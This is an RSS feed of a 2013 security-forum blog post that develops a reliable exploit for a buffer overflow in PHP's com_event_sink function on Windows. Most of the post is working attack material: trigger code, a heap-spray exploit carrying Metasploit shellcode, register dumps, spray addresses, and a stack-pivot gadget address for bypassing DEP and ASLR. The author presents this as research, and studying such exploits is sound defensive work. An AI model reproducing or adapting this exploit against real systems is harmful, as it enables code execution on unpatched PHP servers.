<?xml version="1.0" encoding="ISO-8859-1"?>

<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
	<channel>
		<title>Garage4hackers Forum - Blogs - Rashid bhatt</title>
		<link>http://garage4hackers.com/blog.php?u=3489</link>
		<description>Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research.</description>
		<language>en</language>
		<lastBuildDate>Sun, 22 Mar 2020 10:25:58 GMT</lastBuildDate>
		<generator>vBulletin</generator>
		<ttl>60</ttl>
		<image>
			<url>http://garage4hackers.com/images/misc/rss.jpg</url>
			<title>Garage4hackers Forum - Blogs - Rashid bhatt</title>
			<link>http://garage4hackers.com/blog.php?u=3489</link>
		</image>
		<item>
			<title>Reliable PHP Exploitation from Windows XP to Windows 7</title>
			<link>http://garage4hackers.com/entry.php?b=578</link>
			<pubDate>Fri, 11 Jan 2013 14:41:08 GMT</pubDate>
			<description><![CDATA[Theexploit code for PHP <= 5.4.3 (com_event_sink) Code Execution _82307: PHP com_event_sink Function Overflow DoS (http://osvdb.org/show/osvdb/82307)...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><font color="#000000"><span style="font-family: Times New Roman"><font size="3">Theexploit code for PHP &lt;= 5.4.3 (com_event_sink) Code Execution </font></span></font><font color="#000080"><font size="3"><u><a href="http://osvdb.org/show/osvdb/82307" target="_blank">82307: PHP com_event_sink Function Overflow DoS</a> </u></font></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3">was published by Rahul Saasi some time before on this forum and both ofus had a nice discussion about the vulnerability and possible attack vectors.</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Itried to dig deeper into the issue because exploiting this vulnerability with 100% reliability was quite challenging. In fact the exploit provided by both of us (rahul and me ) earlier, is not reliable at all because of the following reasons.</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">1:The shellcode buffer and the place from where EAX is fetched depends HIGHLY upon pre-determined memory location from the heap region A single change(even a white space) in the source code of the exploit will result in change in memory location of our shellcode buffer.</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">2:It may work if the exploit code is the lone script executing on the victim machine, but again memory offset will definitely change from OS to OS and service pack to service pack. so if you are able to inject the php exploit through an RFI(remote file inclusion) web vulnerability to attack the server the exploit is most likely not going to work.<br />
</font></span></font><br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Thesecond part of this vulnerability is the main challenge and gives a false impression of ASLR even on the systems not running under such aprotection.</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Now, i have figured out two ways to reliably exploit on different OS'es.These methods can be used to bypass DEP and ASLR (separately) with 100% accuracy across different platforms.</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><b>                                                     What’s wrong with the previous exploits?</b></font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">The previous exploits seemed to be working when the above given constraints are not present i.e under a single system and it was the only script running, with no change in the source code of the exploit.</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">This will give you an insight of the problems arising with the exploit code. </font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Lets consider the following code to trigger the vulnerability </font></span></font><br />
<br />
<br />
<br />
<br />
<font color="#000000"><span style="font-family: Courier New"><font size="2">&lt;?php</font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2">$buffer= str_repeat(&quot;a&quot;, 100); &lt;&lt; edi </font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Courier New"><font size="2">$vVar= new VARIANT(0x04040404); </font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2">$vVar2= new VARIANT(&quot;hello&quot;); </font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Courier New"><font size="2">com_event_sink($vVar,$vVar2, $buffer); </font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Courier New"><font size="2">?&gt;</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">In this case the register output will be </font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>EAX 00000000</i></font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>ECX 00362940</i></font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>EDX 0110D598</i></font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>EBX 00000000</i></font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>ESP 00C1F9F8</i></font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>EBP 00C1FA4C</i></font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>ESI 04040404</i></font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i><b>EDI0110D608 ASCII &lt;&lt;&lt; edi</b></i></font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  a  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  &quot;</i></font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>EIP102F59BD php5ts.102F59BD</i></font></span></font><br />
<br />
<br />
<br />
<br />
<font color="#000000"> <span style="font-family: Times New Roman"><font size="3">Fine, so EDI happens to hold our buffer at the location  </font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><b>0x</b></font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i><b>0110D608</b></i></font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i><b>NOTE:</b></i></font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>Please don’t be confused with the ASCII representation of our buffer . Basically in  ZEND Engine the php strings are stored in unicode(2 bytes) form because we are passing the string to com_event_sink  function , its later on converted to ASCII representation using zend_parse_parameter() ZEND API function. </i></font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>As done in source code of com_com.c</i></font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>File:com_com.c fucntion:com_event_sink()</i></font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&gt;&gt; parameter parsed </i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>if(FAILURE == zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC,&quot;Oo|z/&quot;,<br />
            &amp;object, php_com_variant_class_entry,&amp;sinkobject, &amp;sink)){<br />
        RETURN_FALSE;<br />
    }<br />
<br />
    php_com_initialize(TSRMLS_C);<br />
    obj= CDNO_FETCH(object);<br />
    <br />
    if (sink &amp;&amp; Z_TYPE_P(sink) ==IS_ARRAY) {<br />
        /* 0 =&gt; typelibname, 1 =&gt; dispname */<br />
        zval**tmp;<br />
<br />
        if (zend_hash_index_find(Z_ARRVAL_P(sink), 0,(void**)&amp;tmp) == SUCCESS)<br />
            typelibname =Z_STRVAL_PP(tmp);<br />
        if (zend_hash_index_find(Z_ARRVAL_P(sink), 1,(void**)&amp;tmp) == SUCCESS)<br />
            dispname = Z_STRVAL_PP(tmp);<br />
    }else if (sink != NULL) {<br />
        convert_to_string(sink);<br />
        dispname= Z_STRVAL_P(sink); //</i></font></span></font><font color="#000000"><span style="font-family: Courier New"><font size="2"><i><b>convert to string representation</b></i></font></span></font><font color="#000000"><span style="font-family: Courier New"><font size="2"><i><br />
    }</i></font></span></font><br />
<br />
<br />
<br />
<br />
<font color="#000000"> <span style="font-family: Times New Roman"><font size="3">Now,because the values are stored somewhere in the heap and unfortunately that region of heap also happens to hold the information regarding the parse table of PHP  source code in close  boundaries. Now even a single change in the source code of the exploit will result in the change of address location of our buffer (EDI in this case) in the heap region. To show that, i will add a single comment line in the exploit  source code and then we will examine the difference between the previous and the next memory location.</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Courier New"><font size="2">&lt;?php</font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2">//Hello this is a comment</font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2">$buffer= str_repeat(&quot;a&quot;, 100); &lt;&lt; edi </font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Courier New"><font size="2">$vVar= new VARIANT(0x04040404); </font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2">$vVar2= new VARIANT(&quot;hello&quot;); </font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Courier New"><font size="2">com_event_sink($vVar,$vVar2, $buffer); </font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">?&gt;</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">EAX 00000000</font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">ECX 00362940</font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">EDX 0110D538</font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">EBX 00000000</font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">ESP 00C1F9F8</font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">EBP 00C1FA4C</font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">ESI 04040404</font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><b>EDI 0110D5A8 ASCII&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  aaaaaa  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  &quot;</b></font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">EIP 102F59BD php5ts.102F59BD</font></span></font><br />
<br />
<br />
<font color="#000000"> <span style="font-family: Times New Roman"><font size="3">Now its clearly seen below that there is a huge difference between the memory location of our buffer that comes after we make a slight change in the source code. Wonder how much will be the difference when there a large amount of code added ?</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i><b>EDI– </b></i></font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><b>0110D608</b></font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i><b>EDI– </b></i></font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><b>0110D5A8</b></font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">That brings out large unpredictability if the vulnerability is exploited in such a way. </font></span></font><br />
<br />
<br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><b>                              Exploiting with Browser fashioned Heap spraying(Bypass ASLR).</b></font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">As we have already seen the unpredictability if offsets are hard-coded ,we can use browser styled heap spraying for precision.</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">We will spray the heap enough to reach to the memory location 0x04040404 and also we will use this address as our jump location with spray value as 0x04 itself.</font></span></font><br />
<br />
<br />
<br />
<br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&lt;?php</i></font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>$buffer= str_repeat(&quot;\x04\x04&quot;, 27108862).  </i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31&quot;.// Metasploit calc.exe shellcode</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff&quot;.</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&quot;\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;;</i></font></span></font><br />
<br />
<br />
<br />
<br />
<br />
<br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>$vVar= new VARIANT(0x04040404); </i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>$vVar2= new VARIANT(&quot;hello&quot;); </i></font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>com_event_sink($vVar,$vVar2, NULL); </i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>?&gt;</i></font></span></font><br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Now when the jump takes place somewhere near 0x04040404 , machine will encounter 0x04 bytes which disassemble to </font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>addal,4 </i></font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3">which basically is a NOP code.<br />
</font></span></font><br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Following is the basic idea behind the heap spray </font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Courier New"><font size="2">MOVEAX,DWORD PTR DS:[ESI] &lt;&lt; EAX == 0x04040404</font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2">CALLDWORD PTR DS:[EAX+10] &lt;&lt; JMP 0x04040404 because [eax + 10] =0x04040404</font></span></font><br />
<br />
<i><font color="#000000"><span style="font-family: Times New Roman"><font size="3">Note:Because i  tested the exploit using a Virtual machine which has limited memory capacity of 512MB, you may have to choose different spray addresses on machine with higher memory range </font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">The following memory addresses can be used as spray as they also behave as NOP 's</font></span></font><br />
</i><br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">0x05050505 =    ADD EAX,5050505  &lt;&lt;&lt; acts as a NOP</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">0x0c0c0c0c  =     OR AL, 0C &lt;&lt; also acts as a NOP</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">0x0d0d0d0d =    OR EAX,0d0d0d0d....</font></span></font><br />
<br />
<br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><b>                          Knocking Stack variables for Precision( Bypass DEP fast no need to spray).</b></font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">As, we have already seen that static offsets in the heap region of the php interpreter are quite unreliable to use. Now in order to be precise in offsets , we can use stack memory region for that we need a way to populate the stack memory region . At the same time we know that there is no way by which ,we can populate stack using php variables because they are stored in heap rather than on stack.</font></span></font><br />
<br />
<br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">While checking out  the ZEND Engine source code i figured out a way to populate stack region </font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">PHP modules uses  </font></span></font><font color="#000000"><span style="font-family: Courier New"><font size="2"><i>zend_parse_parameters()</i></font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3">API function to get the variables passed to a php fucntion in C Styled declaration.</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Somemodule store the variables in heap and some declare them as local</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">for example if you read the sourcecode of php_ftp.c from ftp module ofphp </font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>/*{{{ proto resource ftp_connect(string host [, int port [, inttimeout]])<br />
   Opens a FTP stream*/<br />
PHP_FUNCTION(ftp_connect)<br />
{<br />
    ftpbuf_t    *ftp;<br />
    char        *host;<br />
    int        host_len;<br />
    long        port = 0;<br />
    long        timeout_sec = FTP_DEFAULT_TIMEOUT;<br />
<br />
    if(zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &quot;s|ll&quot;,&amp;host, &amp;host_len, &amp;port, &amp;timeout_sec) == FAILURE){<br />
        return;<br />
    }</i></font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">you can see that many variable like host_len, port and timeout are stored on the stack , we can use this function to populate the stack memory.</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">This subroutine happens to be present at  0x10300B79   inside php5ts.dll</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">hereis the disassembly </font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B79  55               PUSH EBP</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B7A  8BEC             MOV EBP,ESP</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B7C  83EC 10          SUB ESP,10</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B7F  56               PUSH ESI</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B80  8B75 1C          MOV ESI,DWORD PTR SS:[EBP+1C]</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B83  57               PUSH EDI</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B84  8D45 FC          LEA EAX,DWORD PTR SS:[EBP-4]</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B87  50               PUSH EAX</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B88  8D45 F8          LEA EAX,DWORD PTR SS:[EBP-8]</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B8B  50               PUSH EAX</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B8C  8D45 F0          LEA EAX,DWORD PTR SS:[EBP-10]</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B8F  50               PUSH EAX</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B90  8D45 F4          LEA EAX,DWORD PTR SS:[EBP-C]</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B93  50               PUSH EAX</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B94  68 B8A95410      PUSH php5ts.1054A9B8 ; ASCII &quot;s|ll&quot;</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B99  56               PUSH ESI</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B9A  FF75 08          PUSH DWORD PTR SS:[EBP+8]</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B9D  33FF             XOR EDI,EDI</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B9F  897D F8          MOV DWORD PTR SS:[EBP-8],EDI</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300BA2  C745 FC 5A000000 MOV DWORD PTR SS:[EBP-4],5A</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300BA9  E8 B21CD4FF      CALL php5ts.zend_parse_parameters</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300BAE  83C4 1C          ADD ESP,1C</i></font></span></font><br />
<br />
<br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Now in this case we will try to use the port to populate stack region at 0x00C1FA88 </font></span></font><br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">and as we know that the vulnerability triggers by the following assembly sequence </font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Courier New"><font size="2">MOVEAX,DWORD PTR DS:[ESI] &lt;&lt; ESI  = </font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>0x00C1FA88- 10</i></font></span></font><br />
<font color="#000000"><span style="font-family: Courier New"><font size="2">CALLDWORD PTR DS:[EAX+10] &lt;&lt; xchg esp,edi </font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Wewill use a stack pivoting gadget to make ESP point to EDI ( whichhold our ROP payload )</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">php5ts.dll is quite dense and luckily a lot of gadgets related to stack pivoting are found there</font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">we will use the gadget found in php5ts.dll at  </font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>0x10005767 XCHG ESP, EDI,</i></font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Set the value of timeout variable to  “0x00C1FA88 – 10” , and laterwhen the call [eax +10] takes place it will land to  </font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>0x10005767XCHG ESP, EDI Gadget.</i></font></span></font><br />
<br />
<br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Videos: In the following videos i am running the same exploit on windows XP(no SP), XP sp2, and windows 7.  The video is to demonstrates the reliability of the techniques used. </font></span></font><br />
<br />
<br />
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Note:Because the PHP binary has been compiled with /NXCOMPACT MSVC compiler flag, which basically enforces the loader to use DEP for the binary , If you are testing with heap spraying please disable DEP before proceeding .<br />
</font></span></font><b><br />
Windows 7</b><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><br />
</font></span></font>
<iframe class="restrain" title="YouTube video player" width="640" height="390" src="//www.youtube.com/embed/gArr78g6IMk?wmode=opaque" frameborder="0"></iframe>
<br />
<br />
<b>Windows XP SP2</b><br />

<iframe class="restrain" title="YouTube video player" width="640" height="390" src="//www.youtube.com/embed/QnQcXLr80E0?wmode=opaque" frameborder="0"></iframe>
<br />
<b><br />
Windows XP (NOSP)<br />
</b>
<iframe class="restrain" title="YouTube video player" width="640" height="390" src="//www.youtube.com/embed/6MNzPk0GN40?wmode=opaque" frameborder="0"></iframe>
</blockquote>

]]></content:encoded>
			<dc:creator>Rashid bhatt</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=578</guid>
		</item>
	</channel>
</rss>
